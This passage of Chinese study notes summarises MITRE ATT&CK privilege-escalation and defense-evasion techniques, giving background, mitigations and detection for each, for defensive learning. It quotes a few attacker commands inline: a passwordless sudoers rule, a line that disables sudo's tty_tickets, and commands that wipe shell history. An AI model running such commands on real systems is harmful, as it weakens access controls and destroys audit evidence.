监视和分析对 `CreateProcess/` 的API调用 `CreateProcessA` ，特别是来自用户/潜在恶意进程的API调用，并使用显式分配PPID的参数（例如：进程创建标志0x8XXX，指示正在使用扩展的启动信息创建进程）。对 `CreateProcess/` 的恶意使用`CreateProcessA`也可能通过调用来进行 `UpdateProcThreadAttribute`，这可能是更新流程创建属性所必需的。这可能会因正常的UAC抬高行为而产生误报，因此，如果可能，请与系统基准/正常系统活动的理解进行比较。

***

### Path Interception

>同 [路径劫持](#path-interception-%e8%b7%af%e5%be%84%e6%8b%a6%e6%88%aa)

***

### Plist Modification

>同 [修改Plist](#plist-modification-%e4%bf%ae%e6%94%b9plist)

***

### Port Monitors

>同 [端口监视器](#port-monitors-%e7%ab%af%e5%8f%a3%e7%9b%91%e8%a7%86%e5%99%a8)

***

### PowerShell Profile

>同 [PowerShell 配置文件](#powershell-profile-powershell-%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6)

***

### Process Injection (进程注入)

>[原文链接](https://attack.mitre.org/techniques/T1055/)

进程注入是一种在独立活动进程的地址空间中执行任意代码的方法。在另一个进程的上下文中运行代码会允许代码访问进程的内存、系统/网络资源，以及可能提升的特权。由于合法进程掩盖了（注入进程的）执行，因此通过进程注入执行也可规避对安全产品的检测。

#### Windows

将代码注入实时进程有多种方法。Windows 下的实现包括：

- 动态链接库 (DLL) 注入涉及在进程中写入恶意 DLL 的路径，然后通过创建远程线程调用执行。
- 可移植性可执行注入包括将恶意代码直接写入进程（磁盘上没有文件），然后使用附加代码或创建远程线程调用执行。注入代码的替换要求重新映射内存引用。这种方法的变体，如反射 DLL 注入（将自映射 DLL 写入进程）和内存模块（写入进程时映射 DLL)，解决了了地址重定位问题。
- 线程执行劫持涉及将恶意代码或 DLL 路径注入进程的线程。与进程镂空类似，首先必须挂起线程。
- 异步过程调用 (APC) 注入涉及将恶意代码附加到进程线程的 APC 队列 。当线程进入可变状态时，执行在 APC 队列的函数。APC 注入的一种变体为"Early Bird 注入"，它涉及到创建一个挂起的进程，在进程的入口点（以及可能随后的反恶意软件钩子）之前，通过 APC 编写和执行恶意代码。 AtomBombing 是另一种变体，它利用 APC 调用以前编写到全局原子表的恶意代码。
- 线程本地存储 (TLS) 回调注入涉及操作可移植性可执行文件 (PE) 中的指针，以便在到达代码的合法入口点之前将进程重定向到恶意代码。

#### Mac & Linux

- LD_PRELOAD、LD_LIBRARY_PATH (Linux)、DYLD_INSERT_LIBRARIES (Mac OS X) 环境变量或 dlfcn 应用程序编程接口 (API) 可用于动态加载进程中的库（共享对象），该库可用于拦截运行进程中的 API 调用。
- Ptrace 系统调用可用于附加到正在运行的进程并在运行时修改它。 
- /proc/[pid]/mem 提供对进程内存的访问，可用于对进程读写任意数据。因其复杂性，该技术十分少见。
- VDSO 劫持通过操作 linux-vdso.so 共享对象映射的桩代码，在 ELF 二进制文件上执行运行时注入。 恶意软件通常利用进程注入来访问系统资源，通过这些资源可以获得持久性和修改其他环境。 更复杂的示例：使用命名管道或其他进程间通信 (IPC) 机制作为通信通道，执行多进程注入来分割模块并进一步规避检测。

#### 防御方式

缓解|描述
:--:|:--
**端点行为预防**|可以将某些终结点安全解决方案配置为基于注入过程中发生的常见行为序列来阻止某些类型的过程注入
**特权账户管理**|使用 Yama 限制特权用户只能使用 ptrace，从而缓解基于 ptrace 的进程注入。 其他缓解控制包括部署提供高级访问控制和进程限制的安全内核模块，如 SELinux、grsecurity 和 AppAmour

#### 检测手段

监控各种类型代码注入的 Windows API 调用可能产生大量的数据，并且对防御可能没有直接用处，除非是在特定情况下针对已知的错误调用序列收集，因为良性的 API 函数调用可能是常见的，难以将其与恶意行为区分开。 诸如 CreateRemoteThread，SuspendThread / SetThreadContext / ResumeThread，QueueUserAPC / NtQueueApcThread 之类的 API 调用以及可用于修改另一个进程内的内存的 API 调用（例如 WriteProcessMemory）可用于此技术。

监测 Linux 特定的调用，如 ptrace 系统调用，LD_PRELOAD 环境变量的使用，或 dlfcn 动态链接 API 调用，由于其专业特性，它们不会产生大量数据，可以非常有效地检测一些常见的进程注入的方法。

监视命名管道的创建和连接事件（事件 ID 17 和 18)，以获取外部模块感染进程的潜在标志。

监视可以在代码注入前后完成的进程和命令行参数操作，并将信息与相关的事件信息关联起来。 代码注入也可以通过 PowerShell 和 PowerSploit 等工具执行， 因此可能需要额外监控 PowerShell 来覆盖这种行为的已知实现。

***

### Scheduled Task

>同 [计划任务](#scheduled-task-%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1)

***

### Service Registry Permissions Weakness

>同 [服务注册表权限缺陷](#service-registry-permissions-weakness-%e6%9c%8d%e5%8a%a1%e6%b3%a8%e5%86%8c%e8%a1%a8%e6%9d%83%e9%99%90%e7%bc%ba%e9%99%b7)

***

### Setuid and Setgid

>同 [Setuid 和 Setgid](#setuid-and-setgid-setuid-%e5%92%8c-setgid)

***

### SID-History Injection (SID-History 注入)

>[原文链接](https://attack.mitre.org/techniques/T1178/)

Windows 安全标识符 (SID) 是独一无二的，用于标识用户或组帐户。 Windows 安全中心在安全描述符和访问令牌中都使用 SID。 帐户可以在 SID-History Active Directory 属性 中保存额外的 SID，允许域之间的可互操作帐户迁移（例如，SID-History 中的所有值都包含在访问令牌中）。

攻击者可以利用此机制提升权限。 使用域管理员（或等效的）权限，可以将获取的或已知的 SID 值 插入到 SID- history 中，以冒充任意用户/组（如企业管理员）。 这种操作可以通过横向移动技术（如远程服务、Windows 管理共享或 Windows 远程管理），提高对本地资源和/或其他不可访问域的访问权。

#### 防御方式

缓解|描述
:--:|:--
**Active Directory配置**|合法帐户迁移完成后清理 SID-History 属性。 考虑将 SID 过滤应用于林间信任，例如林信任和外部信任，以从访问域资源的请求中排除 SID-History。 SID Filtering 确保任何基于信任的身份验证请求只包含来自受信任域的安全主体的 SID（即防止受信任域声明用户具有域外组的成员身份）。 默认情况下启用森林信任的 SID Filtering，但可能在某些情况下被禁用以允许子域临时访问森林信任。 使用 Server 2003 或更高版本的域控制器在所有创建的外部信任上自动启用外部信任的 SID Filtering。 但是请注意，SID Filtering 不是自动应用于 legacy trusts 的，可能被故意禁用以允许域间的资源访问。 可通过以下方式应用 SID Filtering:- 使用 netdom 工具禁用林信任的 SIDHistory(netdom trust /domain:/EnableSIDHistory:no on the domain controller)。- 将 SID Filter Quarantining 应用于使用 netdom 工具的外部信任（netdom trust /domain:/quarantine:yes on the domain controller)- 不建议将 SID Filtering 应用于单个林中的域信任，因为这是不受支持的配置并可能中断更改。 如果森林中的域是不可信任的，那么它就不应该成为森林中的一员。 在这种情况下，有必要首先将受信任域和不受信任域分割到不同的林中，其中 SID Filtering 可应用于信任。

#### 检测手段

使用 PowerShell Get-ADUser Cmdlet 检查用户的 SID-History 属性中的数据，尤其是具有来自同一域的 SID-History 值的用户。

监视域控制器上的帐户管理事件，以确定对 SID-History 成功或失败的更改。

监视对 DsAddSidHistory 函数的 Windows API 调用。

***

### Startup Items

>同 [启动项](#startup-items-%e5%90%af%e5%8a%a8%e9%a1%b9)

***

### Sudo (Sudo)

>[原文链接](https://attack.mitre.org/techniques/T1169/)

`/etc/sudoers` 文件描述了哪些用户可以运行哪些命令以及从哪些终端运行这些命令。它还描述了哪些命令用户可以作为其他用户或组运行。这提供了最小权限的概念，即用户在大多数时间内以尽可能低的权限运行，只在需要时提升到其他用户或权限，通常通过提示输入密码进行提权。然而，sudoers 文件还可以通过 `user1 ALL=(ALL) NOPASSWD: ALL` 来指定何时不提示用户输入密码：

攻击者可以利用这些配置以其他用户身份执行命令或者生成具有更高权限的进程。但是必须具有高权限才能编辑该文件。

#### 防御方式

缓解|描述
:--:|:--
**特权账户管理**|通过要求输入密码，即使对手可以访问终端，他们也必须知道密码才能运行sudoers文件中的任何内容
**限制文件和目录权限**|应当严格编辑sudoers文件，以便始终需要输入密码，并且用户不能像具有较高特权的用户一样生成危险的进程

#### 检测手段

在 Linux 上，auditd 可以在每次用户的实际 ID 和有效 ID 不同时发出告警（这是在 sudo 时发生的情况

***

### Sudo Caching (Sudo 缓存)

>[原文链接](https://attack.mitre.org/techniques/T1206/)

`sudo` 命令“使得系统管理员可以授权特定用户或用户组作为 root 或他用户执行某些（或所有）命令，同时还能够对命令及其参数进行审核跟踪”。 sudo 是为系统管理员创建的，因此具有一些有用的配置特性，比如 `timestamp_timeout`，是 sudo 记录密码的时间（以分钟为单位），超过后重新提示输入密码。 这是因为 sudo 能够缓存一段时间的凭据。 Sudo 在 `/var/db/sudo` 上创建一个文件，该文件带有 Sudo 上次运行的时间戳，以确定是否超时。 此外，还有一个 tty_tickets 变量，独立处理每个新的 tty（终端会话）。 这意味着，例如，一个 tty 的 sudo 超时不会影响另一个 tty（您必须再次输入密码）。 攻击者可以滥用此不良配置来提升特权，而无需用户的密码。 可以监视 `/var/db/sudo` 的时间戳，查看它是否在 `timestamp_timeout` 范围内。 如果是，恶意软件就可以执行 sudo 命令，而无需提供用户密码。 当 tty_tickets 被禁用时，攻击者可以从该用户的任意 tty 执行此操作。 通过执行 `echo“default !tty_tickets”>> /etc/sudoers`，OSX Proton 恶意软件禁用 tty_tickets 来简化脚本。 为了这种变化生效，Proton 恶意软件还必须执行 `killall Terminal`。 在 macOS Sierra 中，sudoers 文件默认启用 tty_tickets。

#### 防御方式

缓解|描述
:--:|:--
**操作系统配置**|确保启用 tty_tickets 设置，防止跨 tty 会话的这种泄漏
**特权账户管理**|设置 timestamp_timeout 为 0 将要求用户每次执行 sudo 时都输入密码

#### 检测手段

这种技术滥用 macOS 和 Linux 系统中的正常功能，但是 sudo 能够基于 `/etc/sudoers` 文件中的 LOG_INPUT 和 LOG_OUTPUT 指令记录所有输入和输出。

***

### Valid Accounts

>同 [合法账号](#valid-accounts-%e5%90%88%e6%b3%95%e8%b4%a6%e5%8f%b7)

***

### Web Shell

>同 [Web Shell](#web-shell-web-shell)

***

## Defense Evasion (防御规避)

>[攻击者正试图隐藏](https://attack.mitre.org/tactics/TA0005)

**防御规避** 是指攻击者在**整条攻击链**中避免被发现的技术。包括**免杀**(uninstalling/disabling 卸载/瘫痪安全软件)和**加固**(obfuscating/encrypting 混淆/加密脚本和数据)，攻击者同样**武器化**利用受信任的进程来隐藏和伪装恶意软件。

***

### Access Token Manipulation

>同 [篡改访问令牌](#access-token-manipulation-%e7%af%a1%e6%94%b9%e8%ae%bf%e9%97%ae%e4%bb%a4%e7%89%8c)

***

### Application Access Token (应用程序访问令牌) (SaaS&Office 365)

>[原文链接](https://attack.mitre.org/techniques/T1527/)

#### 背景

- 应用程序访问令牌用于代表用户发出授权的API请求，并且通常被作为在**云上应用**和**SaaS**(软件即服务)中访问资源的方式；
- 这些框架(如Oauth)可共同用于验证用户并确定用户被允许执行的操作。一旦建立了认证，令牌就可以授权操作，而无需传递用户的实际凭据；
- 攻击者可以使用应用程序访问令牌绕过传统的身份验证过程，并访问远程系统上的受限帐户、信息或服务，并作为**其他类型攻击的初始步骤**；
- 如果令牌授予受害者电子邮件的访问权限，则攻击者可能会通过触发忘记的密码，将访问权限扩展到目标用户订阅的所有其他服务。

#### 利用场景

- 以Oauth为例，如果后台访问的"更新令牌"功能启用，一旦将OAuth访问令牌被恶意程序利用，攻击者就有可能获得对用户帐户功能的**长期访问**；
- 通过令牌进行的直接API访问**不受第二个身份验证因素的影响**，并且可能绕过更改密码等策略的影响；
- 由于访问可以与合法的操作流程保持一致，因此即使从服务端也**难以检测**到通过API进行的访问滥用。

#### 防御方式

缓解|描述
:--:|:--
**日志审计**|监视令牌异常使用情况以及授予异常或可疑应用程序的权限;
**信息加密**|在包含敏感信息传输的邮件通信中，强制实施加密;
**Web内容限制**|更新策略，以限制将哪些类型的第三方应用程序添加到与公司的信息，帐户或网络链接的任何在线服务或工具。

#### 检测

- **监视访问令牌活动**：管理员可以设置各种日志，并利用审核工具来监视令牌异常使用情况以及授予异常或可疑应用程序的权限。例如，审核报告使管理员能够识别提权操作，例如角色创建或策略修改等初次访问后执行的操作。

***

### Binary Padding (二进制填充) (all)

>[原文链接](https://attack.mitre.org/techniques/T1009/)

#### 背景

- 在不影响恶意软件功能和行为的前提下，使用二进制填充添加脏数据(junk data)并更改其在磁盘上的表现形式；
- 填充部分通常由制造脏数据的函数生成，附加在末尾或恶意程序各个部分。

#### 利用场景

- 改变文件**散列**，用以绕过基于哈希(hash-based)的工具的检测/防御机制；
- 改变文件**大小**，用以绕过不为大文件提供检测服务工具的机制(如VirusTotal)，并减少了文件被收集分析的可能性。

#### 防御方式

- 属于系统功能滥用，无法简单缓解。

#### 检测

- 基于签名的检测中，引入基于访问(on-access based)的检测与扫描技术
- 基于行为的检测中，横向移动等进行入侵的特征，可以作为指向源文件的标志

***

### BITS Jobs

>同 [BITS Jobs](#bits-jobs-bits-windows%e5%90%8e%e5%8f%b0%e6%99%ba%e8%83%bd%e4%bc%a0%e8%be%93%e6%9c%8d%e5%8a%a1-%e5%88%a9%e7%94%a8)

***

### Bypass User Account Control

>同 [UAC 绕过](#bypass-user-account-control-uac%e7%bb%95%e8%bf%87)

***

### Clear Command History (清除命令历史记录) (Linux&MacOS)

>[原文链接](https://attack.mitre.org/techniques/T1146/)

#### 背景

- macOS和Linux都记录用户在终端terminal中键入的命令，通过`history`命令查看；
- 登录后，在环境变量`HISTFILE`指向的文件中记录`HISTFILESIZE`大小的命令历史记录.用户注销时，信息刷新到主目录名为 `~/.bash_history` 的文件中；
- 保存了在命令行上键入的所有内容，因此也保存了在命令行上传递的密码。

#### 利用场景

- 在`~/.bash_history`等文件中**搜索**明文密码；
- **阻止记录/删除**攻击者键入的命令(`unset HISTFILE`，`export HISTFILESIZE=0`，`history -c`，`rm ~/.bash_history`)。

#### 防御方式

缓解|描述
:--:|:--
**环境变量配置**|将关联`HISTFILE`,`HISTFILESIZE`的环境变量设置为只读，确保保留用户的命令历史记录；
**文件访问控制**|阻止用户删除或写入`~/.bash_history`。

#### 检测

- 基于行为
  - 用户身份验证后(尤其是通过SSH远程登录)，`~/.bash_history`中没有该用户记录的情况
  - 有修改`HISTFILE`和`HISTFILESIZE`环境变量，删除/清空`~/.bash_history`文件操作

***

### CMSTP

>同 [CMSTP](#cmstp-cmstp-microsoft%e8%bf%9e%e6%8e%a5%e7%ae%a1%e7%90%86%e5%99%a8%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6%e5%ae%89%e8%a3%85%e7%a8%8b%e5%ba%8f)

***

### Code Signing (代码签名) (MacOS&Windows)

>[原文链接](https://attack.mitre.org/techniques/T1116/)

#### 背景

- 代码签名为开发人员提供的二进制文件提供了一定程度的真实性，并保证该二进制文件未被篡改；
- 攻击者会**创建、伪造和窃取**在操作过程中使用的证书，将恶意软件和工具伪装为合法二进制文件；
- 未在Linux使用。

#### 利用场景

- 可用于**绕过**要求**签名**才能在系统上执行的安全策略。

#### 防御方式

- 属于系统功能滥用，无法简单缓解。
  
#### 检测

- 收集并分析在环境中执行的软件的签名证书元数据，以查找异常的证书特征和异常值。

***

### Compile After Delivery (交付后编译) (All)

>[原文链接](https://attack.mitre.org/techniques/T1500/)

#### 背景

- 攻击者可能试图通过将文件作为**未编译的代码**交付给受害者；
- 有效载荷
  - 将需要在**执行之前进行编译**；
  - 也可以被**加密、编码和嵌入**在其他文件中；
  - 也可能以**无法识别的格式**传递给本机OS(例如，macOS / Linux上的exe)，然后再通过捆绑的编译器和执行框架重编译为适当的可执行二进制文件。
  - 有效载荷的汇编可能**生成文件和创建文件写入事件**

#### 利用场景

- 与 [**混淆文件或信息**](#obfuscated-files-or-information-%e6%b7%b7%e6%b7%86%e7%9a%84%e6%96%87%e4%bb%b6%e6%88%96%e4%bf%a1%e6%81%af) 相似，基于文本的源代码文件可能会破坏针对可执行文件/二进制文件的保护措施的分析和审查。
  
#### 防御方式

- 属于系统功能滥用，无法简单缓解。
  
#### 检测

- **监视常见编译器**(例如csc.exe和GCC / MinGW)的执行文件路径和命令行参数，并与其他可疑行为相关联；
- **寻找非本机二进制格式以及跨平台的编译器和执行框架**(如Mono)，并确定它们在系统上是否具有合法用途。

***

### Compiled HTML File

>同 [.chm](#compiled-html-file-chm%e6%96%87%e4%bb%b6)

***

### Component Firmware

>同 [组件固件](#component-firmware-%e7%bb%84%e4%bb%b6%e5%9b%ba%e4%bb%b6)

***

### Component Object Model Hijacking

>同 [COM 劫持](#component-object-model-hijacking-com%e5%8a%ab%e6%8c%81)

***

### Connection Proxy (连接代理) (All)

>[原文链接](https://attack.mitre.org/techniques/T1090/)

#### 背景

- 攻击者可以使用连接代理在系统之间定向网络流量，或者充当与命令与服务器进行网络通信的中介，以**避免直接连接**。
- 现有许多工具可以通过**代理**或**端口重定向**达到**流量重定向**，包括HTRAN，ZXProxy和ZXPortMap。

#### 利用场景

- 攻击者使用这类代理来管理命令和控制通信，以**减少出站网络连接的数量**，在连接丢失时提供**弹性**(resiliency，即使其中一个或多个节点停止工作，整个系统也必须能继续运行)，**跨越**受害者之间现有的**可信通信路径**以避免怀疑。
- **外部连接代理**：
  - 用于**掩盖C2流量**(命令控制)的目的地，通常使用端口重定向实现。
  - 受害环境之外的脆弱系统以及已购买的基础架构(如基于云的资源或虚拟专用服务器)可能被作为pivot。
  - 基于对从受感染系统到代理的连接被调查的可能性小的原则选择代理。
  - 受害者系统将直接与Internet上的外部代理进行通信，然后该代理会将通信**转发**到C2服务器。
- **内部连接代理**:
  - 可用于**合并来自受感染系统的内部连接**。
  - 攻击者可能使用脆弱的内部系统作为代理，以**隐藏C2流量真实目的地**。
  - 代理可以将流量从网络内部的受感染系统重定向到外部C2服务器，从而**难以发现恶意流量**。
  - 另外，该网络可用于将信息从一个系统转发到另一个系统，以**避免流量广播**。
- **ssrf**

#### 防御方式

缓解|描述
:--:|:--
**网络入侵防御**|使用网络签名识别特定攻击者恶意软件流量的NIPS可用于减轻网络级别的活动。

#### 检测

- **基于特征**:
  - 通常不进行网络通信的进程使用网络；
  - 陌生进程使用网络；
  - 通常需要用户操作的进程中，用户驱动与网络活动分离。
- **数据流分析**
  - 不常见的数据流行为(客户端发送数据远大于服务器接收的数据/不应频繁通信的服务频繁通信等)；
  - 通常不进行网络通信的进程使用网络；
  - 陌生进程使用网络；
- **数据包分析**：分析数据包内容，检测端口不遵循本应使用协议的通信行为。

#### 备注

- 签名通常用于协议内的**唯一指示符**，并且可能由特定攻击者或工具使用的特定C2协议决定，在不同恶意软件系列和版本中可能不同。
- 攻击者可能会随着时间推移和协议构建**改变工具/C2的签名**，以避免被常见防御工具发现。
***

### Control Panel Items

>同 [控制面板项](#control-panel-items-%e6%8e%a7%e5%88%b6%e9%9d%a2%e6%9d%bf%e9%a1%b9)

***

### DCShadow (DCShadow)

>[原文链接](https://attack.mitre.org/techniques/T1207/)

#### 背景

- DCShadow是一种通过**注册**(或进行再次非活跃注册inactive registration)并**冒充**域控制器(DC)的行为来操作活动目录 Active Directory(AD)数据，包括对象和架构(objects and schemas)的方法。
  >[案例](https://www.secpulse.com/archives/70892.html)
- 一旦注册成功，影子DC就可以为包括凭据和密钥在内的任何域对象进行**注入和更改**，并将其复制到AD基础结构中。
- 注册恶意DC需要在AD模式的配置`Configuration`中创建新服务器和`nTDSDSA`对象，这需要管理员权限(DC的域权限或本地权限)或KRBTGT哈希。
  
#### 利用场景

- 此技术可能会**绕过系统日志记录和安全监视设备**，如SIEM产品(因为影子DC采取的操作可能不会报告给这些传感器)。
- 该技术还可以用于**更改和删除备份数据**以及其他关联的元数据，以阻止深度分析(法医分析)forensic analysis。
- 攻击者还可以利用此技术执行**SID历史记录注入**和操纵AD对象(如帐户，访问控制列表，模式schemas)以**建立持久性后门**。

#### 防御方式

- 属于系统功能滥用，无法简单缓解。

#### 检测

- **网络流量**：
  - 监视和分析与DC之间以及DC与非DC主机之间的**数据复制**(例如，对`DrsAddEntry`、`DrsReplicaAdd`，尤其是`GetNCChanges`的调用)相关的网络流量。DC复制会每15分钟自动进行一次，但也可以由攻击者或合法的紧急更改(如修改密码)触发。
  - 监视和警告AD**对象复制**(审核详细目录服务复制事件Audit Detailed Directory Service Replication `Events 4928/4929`)。
- **目录状态**：利用AD目录同步(DirSync)，监视使用AD复制cookies导致的目录状态更改。
- **Configuration**：对AD模式的配置`Configuration`进行定期基线分析，并在创建`nTDSDSA`对象时发出警报。
- **SPN使用情况**：
  - 与目录复制服务(DRS,Directory Replication Service)远程协议接口(`GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2`)关联的SPN可以在不记录的情况下设置。
  - 可以检测不在 DC 组织单元(OU,organizational unit)中的计算机对Kerberos服务主体名称(SPNs, Service Principal Names)，尤其是与服务相关联的名称(以“GC/”开头)的使用情况，
  - 恶意的影子DC必须使用这两个SPN作为服务进行身份验证，才能成功完成复制过程。

***

### Deobfuscate/Decode Files or Information (反混淆/解码)

>[原文链接](https://attack.mitre.org/techniques/T1140/)

#### 背景

- 攻击者可能会使用混淆文件或信息来隐藏入侵的分析结果，根据传入信息的利用方式，可能需要使用单独的机制来解码或模糊处理该信息。这样做的方法包括恶意软件内置功能、脚本、PowerShell或使用系统上存在的程序。

#### 利用场景

- 示例之一是使用certutil解码隐藏在证书文件中的远程访问工具的可执行文件。
- 另一个示例是使用Windows `copy /b` 命令将二进制片段重新组装为恶意负载。
- 为了防止检测，有效负载可能被压缩，存档或编码。这些有效负载使用了混淆文件或信息技术，可以在初始访问期间与之后**逃避检测**。
- 有时，作为**用户执行**的一部分，可能需要用户打开灯操作以对其进行去混淆或解码处理。可能还要求用户输入密码以打开由攻击者提供的受密码保护的压缩/编码文件。
- 攻击者也可以使用压缩或存档脚本，例如Javascript。

#### 防御方式

- 属于系统功能滥用，无法简单缓解。

#### 检测

- 如果被混淆/加密的信息中心包含恶意软件中并使用**Windows API**，则在操作之前或之后尝试检测恶意行为，可能会取得比分析加载的库或API调用执行更好的结果。
- 如果使用**脚本**，则需要收集脚本进行分析。
- 对**执行过程和命令行**监视，以检测与脚本和系统实用程序有关的潜在恶意行为(如certutil)。
- 监视**常见存档文件应用扩展程序**(如Zip和RAR存档工具的应用和扩展程序)的执行文件路径和命令行参数，并与其他可疑行为关联，以减少来自正常用户和管理员行为的误报。

***

### Disabling Security Tools (瘫痪安全服务) (All)

>[原文链接](https://attack.mitre.org/techniques/T1809/)

#### 背景

- 攻击者可能会禁用安全服务工具，以避免对其检测。

#### 利用场景

- 关闭安全软件或事件日志记录过程；
- 删除注册表项，导致工具不会在运行时启动；
- 或采取其他方法来干扰安全扫描或事件报告。

#### 防御方式

缓解|描述
:--:|:--
**文件目录权限**|确保适当的进程、注册表和文件权限配置
**用户帐号权限**|确保用户权限配置最小化

#### 检测

- 监视**进程和命令行参数**以查看安全工具是否被杀死或停止运行。
- 监视**注册表编辑器**，是否有对与安全工具相关服务项和启动程序的修改。
- 安全工具缺少日志或事件文件报告。

***

### DLL Search Order Hijacking

>同 [DLL 搜索顺序劫持](#dll-search-order-hijacking-dll%e6%90%9c%e7%b4%a2%e9%a1%ba%e5%ba%8f%e5%8a%ab%e6%8c%81)

***

### DLL Side-Loading (DLL旁路加载) (Windows)

>[原文链接](https://attack.mitre.org/techniques/T1480/)

#### 背景

- 程序可以运行时加载指定的的DLL。错误与模糊的指定会产生问题。
- 当WinSxS(Windows并行清单)对要加载的DLL的特性不够明确时，会发生旁加载漏洞。
- 攻击者可能会利用容易受到侧向加载的合法程序来加载恶意DLL。

#### 利用场景

- 合法受信的系统软件进程中，掩盖执行的操作。

#### 防御方式

缓解|描述
:--:|:--
**审计**|使用Windows的sxstrace.exe以及手动检查，检测清单文件中是否存在软件旁路加载漏洞。
**文件目录权限**|在写保护位置安装软件。
**更新**|定期对系统与软件进行更新。

#### 检测

- 监视进程是否存在异常活动(如不使用网络的进程连接网络)。
- 跟踪DLL的元数据(如哈希)，并将在进程执行时加载的DLL与以前的执行进行比较，检测与补丁或更新无关的可疑差异。

### Execution Guardrails (执行边界) (All)

>[原文链接](https://attack.mitre.org/techniques/T1480/)

#### 背景

- 执行边界会根据目标特定环境存在的特定条件来限制执行操作。确保仅对预定目标执行payload，并减少附带损害。
- 攻击者提供有关目标系统或环境的边界值，可能包括特定网络共享名称，附加物理设备，文件，已加入的Active Directory(AD)域，本地/外部IP地址等。

#### 利用场景

- 通过利用特定于目标的值解密有效载荷，攻击者可以避免将解密密钥与payload一起打包或通过**潜在受监控的网络**连接发送，并且给payload**逆向**带来困难。
- 通常，护栏被用于控制恶意程序的运行环境与限制损害程度/范围，以**避免暴露**。
- 不同于典型的虚拟化/沙盒逃避，护栏根据可以做出**是否进一步参与**的决定，因为其指定的是针对特定目标的价值条件，而不是使其在任何环境中执行功能。

#### 防御方式

- 执行护栏很难通过预防性控制减轻，因为它能保护目标外的数据不受损害。
- 如果应保护的目标明确，则要致力于防止攻击工具在攻击链中更早的运行，并在受到损害时识别后续恶意行为。

#### 检测

- 监视在收集各种系统信息或执行其他形式信息收集(特别是在短时间内)的可疑进程。

#### 补充

- **环境密钥 Environmental keying**
  - 环境密钥是一种类型的护栏，用于从给定计算环境的特定值生成加/密密钥的加密技术。参数从给定环境的特定元素派生，并用于为加密的payload生成解密密钥。
  - 参数可以从**特定**的网络共享、物理设备、软件/软件版本、文件、已加入的AD域、系统时间、本地/外部IP地址等元素中**得出**，通过参数**生成解密密钥**。
  - 将**加密的payload**传递给目标，该目标将在执行之前使用目标的特定参数来解密有效负载。
  - 环境密钥可以使**沙箱检测、反病毒检测、众测和逆向工程**等变得困难。以减慢事件响应速度，并帮助攻击者隐藏TTP(tactics, techniques, and procedures 战术，技术和程序)。

***

### Exploitation for Defense Evasion (漏洞利用免杀) (All)

>[原文链接](https://attack.mitre.org/techniques/T1211/)

#### 背景

- 攻击者利用程序，服务或操作系统软件/内核本身内的程序漏洞来**执行payload**。
- 利用安全防御软件存在的漏洞，来**禁用或规避**它们。

#### 利用场景

- 攻击者利用程序，服务或操作系统软件/内核本身内的程序漏洞来**执行payload**。
- 利用安全软件存在的漏洞，来**禁用或规避**它们。
- 通过事先侦查和在系统被入侵中执行防御软件发现(Security Software Discovery)，对环境中存在的特定安全软件进行攻击。

#### 防御方式

缓解|描述
:--:|:--
**隔离与沙箱**|通过使用沙箱技术，增加攻击者利用未发现未修补的漏洞推进攻击过程的困难。虚拟化和微分段技术也可以缓解某些类型攻击影响。但这些系统中仍然存在其他利用和弱点的风险。
**漏洞利用防护**|Windows Defender漏洞利用防御WDEG、增强缓解经验工具包EMET，等针对漏洞利用过程行为的安全应用程序，可以减轻部分威胁。控制流完整性检查也可以识别和阻止软件攻击发生，但依赖于软件架构与程序二进制文件兼容性，可用性较低。
**威胁情报**|建立强大的网络威胁情报体系，以确定攻击类型与威胁级别，识别与特定组织相关的0day攻击。
**更新**|通过补丁管理定期**更新软件**与系统。

#### 检测

- 基于系统**行为**
  - 在系统被入侵不久后发生，以掩护之后可能用到的其他攻击工具；
  - 成功率不高，可能导致软件运行不稳定或崩溃；
  - 磁盘可疑行为、试图隐藏的进程注入等漏洞成功利用的特征。

#### 补充

- 微分段技术
  - [相关链接](https://www.jianshu.com/p/1921a32afd19)
  - 微分段(Micro-segmentation)是随着网络虚拟化提出的一种安全技术，通过应用该技术，能够提供在工作负载级别(workload level)上使能精细安全策略控制来保障用户业务安全。
  - 使用微分段技术的一个显著好处就是能够将安全能力集成到虚拟化工作负载中，无须硬件设备(硬件防火墙)介入，也意味着将安全策略集成到虚拟网络(virtual network)、虚拟主机(VM)、操作系统以及其他虚拟安全实例中来提供安全。

***

### Extra Window Memory Injection

>同 [窗口内存注入](#extra-window-memory-injection-%e7%aa%97%e5%8f%a3%e5%86%85%e5%ad%98%e6%b3%a8%e5%85%a5)

***

### File and Directory Permissions Modification (文件目录权限修改) (All)

>[原文链接](https://attack.mitre.org/techniques/T1222/)

#### 背景

- 文件和目录权限通常由文件目录所有者指定的**自由访问控制列表DACL**管理。
- DACL的实现可能因平台而异，但通常会明确指定用户/组可以执行的操作，如读写执行等。

#### 利用场景

- **修改指定访问权限**，以修改、替换或删除特定的文件和目录。需要根据现有权限或提权来获得文件所有权。

#### 防御方式

- 属于系统功能滥用，无法简单缓解。

#### 检测

- **监测**所有修改DACL和文件/目录所有权的尝试；
  - Windows中使用`icacls`、`takeown`、`attrib` 和PowerShell `Set-Acl`命令
  - 在MacOS/Linux中使用`chmod`、`chown`命令。
  - 以上许多是内置的系统程序且可能会生成高误报，因此应与系统正常运行基线比较，并将权限修改与其他恶意活动指示相关联。
- 对包含关键二进制/配置文件的文件夹，启用文件/目录权限**更改审核**。
- **审计Windows安全日志**(`Event ID 4670`)。

#### 补充

- **SD**：在Windows系统中，用一个安全描述符((Secrity Descriptors)的结构来保存其权限的设置信息，简称为SD，在Windows SDK中的结构名是SECURITY DESCRIPTOR", 是包括了安全设置信息的结构体。一个安全描述符包含以下信息:
  - **安全标识符**(Security dentifiers),用于记录安全对象的ID。简称为SID。
  - **DACL**(Discretionary Access ControlList,自由访问控制列表)，指出了允许和拒绝某用户或组的存取控制列表。当一个进程需要访问安全对象，系统就会检查DACL来决定进程的访问权。如果一个对象没有DACL,那么任何人都可以拥有完全的访问权限。
  - **SACL**(System Access ControlList,系统访问控制列表)，指出了在该对象上的一组存取方式(如，读、写、运行等)的存取控制权限细节的列表。还有其自身的一些控制位。SACL中的ACE能够产生访问尝试失败或成功的时候产生评估记录，在将来的release中， SACL在未授权用户尝试访问一个对象的时候发出警告
- DACL和SACL构成了整个**访问控制列表Access Control List**, 简称ACL, ACL中的每一项为**ACE(Access Control Entry)安全访问实体**。

***

### File Deletion (文件删除) (All)

>[原文链接](https://attack.mitre.org/techniques/T1107/)

#### 背景

